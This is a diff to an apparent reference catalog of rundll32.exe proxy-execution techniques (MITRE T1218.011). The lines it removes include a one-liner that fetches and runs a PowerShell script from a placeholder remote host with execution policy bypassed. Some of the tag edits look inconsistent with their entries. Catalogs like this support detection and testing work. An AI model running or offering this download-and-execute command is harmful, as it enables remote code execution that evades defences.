@@ -22,26 +22,9 @@ Commands:
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Execute: DLL
-  - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")
-    Description: Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site.
-    Usecase: Execute code from Internet
-    Category: Execute
-    Privileges: User
-    MitreID: T1218.011
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-    Tags:
-      - Execute: JScript
+      - Execute: Remote
   - Command: rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
     Description: Use Rundll32.exe to execute a JavaScript script that runs calc.exe.
-    Usecase: Proxy execution
-    Category: Execute
-    Privileges: User
-    MitreID: T1218.011
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-    Tags:
-      - Execute: JScript
-  - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
-    Description: Use Rundll32.exe to execute a JavaScript script that runs calc.exe and then kills the Rundll32.exe process that was started.
     Usecase: Proxy execution
     Category: Execute
     Privileges: User
@@ -75,8 +58,7 @@ Commands:
     MitreID: T1218.011
     OperatingSystem: Windows 10 (and likely previous versions), Windows 11
     Tags:
-      - Execute: DLL
-      - Execute: EXE
+      - Execute: COM
 Full_Path:
   - Path: C:\Windows\System32\rundll32.exe
   - Path: C:\Windows\SysWOW64\rundll32.exe
